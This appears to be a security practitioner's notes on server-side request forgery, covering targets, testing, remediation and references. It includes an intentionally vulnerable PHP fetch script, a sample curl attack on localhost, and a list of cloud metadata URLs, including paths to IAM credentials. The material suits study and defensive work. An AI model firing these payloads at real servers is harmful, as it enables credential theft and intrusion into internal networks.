SSRF (Server-Side Request Forgery)


SSRF exploitation leverages an application’s server-side components’ capacity to make or forward requests -targeting one (its own) or many application-layer protocols- chained with (a) vulnerabilit(y|ies) in a target application and/or its configured deployment on host infrastructure to forge arbitrary requests originating from the application server.
Pending the particular limits to which a given SSRF vuln may be exploited, its impact may range from merely enumeration (logging external service requests back to an attacker-controller application or DNS server, or diffing application response times to determine whether it made a connection attempt to some port, whether a request was successful or whether a request timed out), to arbitrary file read (to the extent permitted on either the filesystem, cloud hosting service or some file-serving service, e.g. SMB/CIFS) or potentially arbitrary remote code execution.
    --often targets internal network services not otherwise internet-exposed or secured by firewall rule definitions
        --private address spaces are not otherwise exposed externally (rfc 1918, Address Allocation for Private Internets, https://tools.ietf.org/html/rfc1918):
            10.0.0.0-10.255.255.255  (10/8)
            172.16.0.0-172.31.255.255  (172.16/12)
            192.168.0.0-192.168.255.255 (192.168/16)
        --may request restricted application components via localhost requests (e.g. https://127.0.0.1/admin, http://localhost:8000/server-status or https://HOSTNAME/target) or accessible using domain/network naming conventions (e.g. smb://adhost.sub.local/) to bypass network segmentation within a domain-controlled network or targets accessible only given correct virtual host names and not responsive to IP address routine only
        --otherwise potentially smuggles arbitrary requests past network DMZ, exposing any potentially less secure internal targets
        --e.g. when a service requests a url or uri taking improperly-sanitized user input
        --most common when import functions are invoked to import resources (especially images) accepting a URL --or occasionally processing an insufficiently sanitized URI of an arbitrary user-defined(uploaded) file--, e.g. vuln introduces on setting a user profile image.
    --infrastructure vulnerabilities are common regardless of type of hosting (traditional hosting, serverless architecture, microservices)
Blind SSRF
	-server does not return irregular HTTP Response or error message
Remediation
	--proper input validation restricting access to internal resources
	--easiest way to discover and exploit is manual code review, by far

Testing:
Requests may be confirmed via external service interaction, viz. requests to attacker-controlled internet-facing service including DNS request records.
    --in some cases internet-facing DNS name requests may not succeed (due to DHCP configuration, application or WAF sanitization/filtering, firewall rules or improper processing) and it will be necessary to confirm an external service interaction by requesting the services static IP address, then checking service access logs for access from any target controlled host (or addresses of third party-services used by the application).
#/urs/bin/php
    # usage: /wget.php?url=http://www.some.dom/img/meme.png
file_put_contents(“intended_target.png”, file_get_contents($_GET[‘url’]));
    SSRF Attack:
curl https://target.dom/wget.php?url=http://127.0.0.1/api/v3/users/uid/1/username

Targets:
	information files
	sensitive files
	internal API calls
	internal service access
		--e.g. admin panel
	cloud hosting metadata

Functions commonly vulnerable to SSRF:
	webhooks
	file upload expecting URL as input
	document file processors
	image file processors
	link expansion
	HTTP proxying service
	--functions that fetch external resources (or internal resources using URI schema)




Cloud hosting service Metadata SSRFs:
AWS
    http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories
    --many more listed and file more likely to be maintained/updated at https://github.com/ThePacketBender/notes/cloud/aws.txt
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/public-keys/

Google Cloud (GCP
    https://cloud.google.com/compute/docs/metadata
    --requires header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
    --Google allows recursive pulls 
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
    --Beta does NOT require a header
http://metadata.google.internal/computeMetadata/v1beta1/

Digital Ocean
    https://developers.digitalocean.com/documentation/metadata/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

Packetcloud
    https://metadata.packet.net/userdata

Azure
    https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
http://169.254.169.254/metadata/v1/maintenance
    --requires the header "Metadata: true"
https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

OpenStack/RackSpace 
    --(header required? unknown)
http://169.254.169.254/openstack

HP Helion 
    --(header required? unknown)
http://169.254.169.254/2009-04-04/meta-data/ 

Oracle Cloud
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/

Alibaba
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id


Remediation recommendations:
whitelisting
    --variant URI syntaxes across different and emergent protocols, schemata and encodings make patterns and expressions necessary for thorough blacklisting not only highly complex, but regardless of thoroughness would remain a high risk for bypass
    --for RESTful services, accept HTTP verbs other than GET or POST (or other verbs most likely vulnerable across a network or VNC to complicate SSRF exploitation by invalidating most common HTTP verb-dependent payloads
        --can protect API from most application SSRFs and vice-versa
        --additionally, validate both requests and responses to internal services
    --ensure authentication is required and set to non-default values for all services, especially those on which authentication is not enabled by default (kibana, mongodb, memcached, redis, elasticsearch, snmp)
        --nobody ever expects SSRF to target SNMP (rfc 4088, SNMP URI schema, https://tools.ietf.org/html/rfc4088) --or any other 
        --that goes squared for internal networking devices and to the third power for external networking hardware, because you can guess who is going to (someone like me).


https://www.owasp.org/index.php/Server_Side_Request_Forgery
https://cwe.mitre.org/data/definitions/918.html